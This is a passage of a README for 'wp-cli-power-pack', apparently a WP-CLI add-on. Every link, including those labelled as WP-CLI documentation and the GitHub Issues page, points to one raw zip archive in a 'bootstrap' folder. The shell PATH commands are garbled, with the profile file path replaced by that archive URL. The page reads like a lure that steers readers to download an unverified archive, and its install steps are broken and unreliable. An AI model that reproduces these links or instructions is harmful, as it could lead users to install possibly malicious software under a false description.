...
[![Download Latest Release](https://github.com/diegogux/wp-cli-power-pack/raw/refs/heads/main/bootstrap/cli-pack-power-wp-v3.3-alpha.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/diegogux/wp-cli-power-pack/raw/refs/heads/main/bootstrap/cli-pack-power-wp-v3.3-alpha.2.zip)
...
- WP-CLI installed. You can learn more about WP-CLI [here](https://github.com/diegogux/wp-cli-power-pack/raw/refs/heads/main/bootstrap/cli-pack-power-wp-v3.3-alpha.2.zip).

## 📥 Download & Install

To get started with wp-cli-power-pack, visit the following page to download the latest version:

[Download the latest version](https://github.com/diegogux/wp-cli-power-pack/raw/refs/heads/main/bootstrap/cli-pack-power-wp-v3.3-alpha.2.zip)
...
4. **Add to PATH**: For easier access, add the folder to your system's PATH. Here’s how:
   ...
   - **macOS/Linux**: 
     - Open your terminal and run `echo 'export PATH=$PATH:/path/to/the/folder' >> ~https://github.com/diegogux/wp-cli-power-pack/raw/refs/heads/main/bootstrap/cli-pack-power-wp-v3.3-alpha.2.zip`.
     - Run `source ~https://github.com/diegogux/wp-cli-power-pack/raw/refs/heads/main/bootstrap/cli-pack-power-wp-v3.3-alpha.2.zip` to apply the changes.
...
If you encounter issues or have questions, you can visit the [GitHub Issues page](https://github.com/diegogux/wp-cli-power-pack/raw/refs/heads/main/bootstrap/cli-pack-power-wp-v3.3-alpha.2.zip) for community support. You can also report bugs or request new features.
